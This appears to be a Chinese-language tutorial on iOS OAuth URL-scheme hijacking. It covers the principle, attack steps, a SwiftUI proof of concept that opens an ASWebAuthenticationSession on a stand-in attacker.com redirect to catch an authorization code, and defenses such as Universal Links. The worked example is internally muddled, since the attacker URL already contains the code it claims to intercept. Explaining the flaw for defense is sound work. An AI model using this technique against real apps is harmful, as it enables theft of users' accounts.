## iOS 移动应用 OAuth 攻击：URL Scheme 劫持重现

### 简介

研究人员发现，很多流行的 iOS 应用存在安全漏洞，攻击者可以利用这些漏洞，通过**劫持 URL Scheme** 的方式，盗取用户的 OAuth 授权码，从而**完全控制用户的账户**。 这种攻击利用了 OAuth 协议的特性，以及 iOS 系统对自定义 URL Scheme 和 Safari 浏览器会话的处理方式。

简单来说，就是攻击者可以伪装成你的 App，骗取用户的授权码，然后冒充用户登录。

### 漏洞原理

1.  **OAuth 协议与移动应用授权：** OAuth 是一种授权协议，允许用户授权第三方应用访问其在其他平台（如微信、QQ）上的数据，而无需共享密码。在移动应用中，OAuth 通常通过**自定义 URL Scheme** 实现跳转和授权。

2.  **自定义 URL Scheme：** 允许开发者为自己的应用定义一个唯一的 URL Scheme，例如 `myapp://`。当用户点击一个以该 Scheme 开头的链接时，系统会自动打开对应的应用。

    *   **例子：** 你的 App 定义了 `myapp://login`，当用户在短信中点击这个链接时，你的 App 就会被打开，并进入登录页面。
    *   **潜在问题：** 虽然苹果建议使用反向 DNS 作为 URL Scheme，例如 `com.example.myapp://`，但这并不能完全防止其他应用注册相同的 Scheme。如果多个应用注册了相同的 Scheme，系统将无法确定应该打开哪个应用，这为 URL Scheme 劫持创造了机会。

3.  **ASWebAuthenticationSession：** iOS 提供了一个名为 `ASWebAuthenticationSession` 的 API，它允许应用在应用内打开一个浏览器窗口，并且这个浏览器窗口可以访问 Safari 浏览器的 Cookie。这意味着，如果用户在 Safari 中已经登录了某个网站，那么在 `ASWebAuthenticationSession` 中打开该网站时，用户也会自动登录。

    *   **用途：** 简化单点登录 (SSO) 体验。
    *   **风险：** 如果使用不当，可能导致安全问题。

4.  **静默授权 (Silent Authentication)：** OAuth 协议支持一个 `prompt=none` 参数，允许应用在用户不知情的情况下完成授权。如果用户已经登录，并且应用获得了授权，那么授权服务器可以直接返回授权码，而无需用户进行任何交互。

    *   **场景：** 在用户已经登录的情况下，应用可以自动获取授权，无需用户再次点击“允许”按钮。
    *   **风险：** 如果被滥用，可能导致用户在不知情的情况下被恶意应用授权。

### 攻击步骤

1.  **攻击者创建一个恶意应用，并注册一个常见的 URL Scheme**，例如 `fb://` (虽然现在 iOS 已经修复了直接劫持常用 URL Scheme 的问题，但攻击者仍然可以通过其他方式来利用 URL Scheme)。
2.  **恶意应用使用 `ASWebAuthenticationSession` 打开一个网页**，该网页会自动重定向到目标应用的 OAuth 授权端点，并附带 `prompt=none` 参数。
3.  **如果用户在 Safari 中已经登录了目标应用，并且之前已经授权过该应用，那么授权服务器会直接返回授权码**，而无需用户进行任何交互。
4.  **由于 `ASWebAuthenticationSession` 可以接收任何自定义 URL Scheme 的重定向，因此恶意应用可以截获到授权码**，并用它来获取用户的访问令牌，从而控制用户的账户。

### 实际应用例子

假设有一个名为 "ExampleApp" 的应用，它使用 OAuth 协议，并通过自定义 URL Scheme `exampleapp://` 进行授权。

1.  用户在 Safari 中登录了 ExampleApp。
2.  攻击者创建了一个名为 "EvilApp" 的恶意应用。
3.  EvilApp 使用 `ASWebAuthenticationSession` 打开一个网页 `https://attacker.com/redirect?to=exampleapp://oauth/callback?code=XXX`。
4.  由于用户在 Safari 中已经登录了 ExampleApp，并且网页重定向到了 `exampleapp://oauth/callback?code=XXX`，因此 EvilApp 可以截获到授权码 `XXX`。
5.  EvilApp 使用授权码 `XXX` 获取用户的访问令牌，并冒充用户登录 ExampleApp。

### Demo 代码 (Swift)

```swift
import AuthenticationServices
import SwiftUI

struct ContentView: View {
    @State private var openedURL: URL?
    @State private var accessToken: String = ""

    // 替换为攻击者控制的 URL，该 URL 会重定向到目标应用的 URL Scheme
    @State private var asWebAuthURL: String = "https://attacker.com/redirect?to=exampleapp://oauth/callback?code=XXX"
    @State private var asWebAuthScheme: String = "exampleapp" // 目标应用的 URL Scheme

    var body: some View {
        VStack {
            Text("Access Token: \(accessToken)")
                .padding()

            Button("Start ASWebAuthenticationSession") {
                startASWebAuthenticationSession()
            }
            .padding()

            if let url = openedURL {
                Text("Opened URL: \(url.absoluteString)")
                    .padding()
            }
        }
    }

    private func startASWebAuthenticationSession() {
        guard let authURL = URL(string: asWebAuthURL) else { return }

        let session = ASWebAuthenticationSession(url: authURL, callbackURLScheme: asWebAuthScheme) { callbackURL, error in
            if let callbackURL = callbackURL {
                self.openedURL = callbackURL
                if let code = self.extractCode(from: callbackURL) {
                    self.obtainAccessToken(using: code)
                }
            } else if let error = error {
                print("Authentication error: \(error)")
            }
        }

        session.presentationContextProvider = ViewController() // 确保你的 ViewController 遵循 ASWebAuthenticationPresentationContextProviding 协议
        session.start()
    }

    // 假设 URL 格式为 exampleapp://oauth/callback?code=XXX
    private func extractCode(from url: URL) -> String? {
        guard let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
              let queryItems = components.queryItems else {
            return nil
        }

        for item in queryItems {
            if item.name == "code", let code = item.value {
                return code
            }
        }
        return nil
    }

    private func obtainAccessToken(using code: String) {
        // 在真实的场景中，你需要将 code 发送到你的服务器，然后由服务器来交换 Access Token
        // 这里只是一个简单的示例
        self.accessToken = "FakeAccessTokenForCode_\(code)"
    }
}

// 确保你的 ViewController 遵循 ASWebAuthenticationPresentationContextProviding 协议
class ViewController: UIViewController, ASWebAuthenticationPresentationContextProviding {
    func presentationAnchor(for session: ASWebAuthenticationSession) -> ASPresentationAnchor {
        return self.view.window!
    }
}
```

**注意：**

*   这段代码只是一个演示，用于说明 URL Scheme 劫持的原理。
*   在实际应用中，你需要替换 `asWebAuthURL` 和 `asWebAuthScheme` 为目标应用的 URL 和 Scheme。
*   `obtainAccessToken(using:)` 方法需要发送 code 到服务器进行验证，并交换 Access Token。

### 防御方法

1.  **使用通用链接 (Universal Links)：** 通用链接是苹果推荐的替代 URL Scheme 的方案。它使用标准的 HTTP/HTTPS 链接，并通过在你的网站上放置一个 `apple-app-site-association` 文件来验证链接的所有权。这样可以防止其他应用劫持你的链接。
2.  **强制用户交互：** 避免使用 `prompt=none` 参数，强制用户进行交互，例如显示一个授权确认页面。
3.  **验证客户端：** 按照 RFC 6819 的建议，对无法可靠验证的客户端，不要执行自动授权。

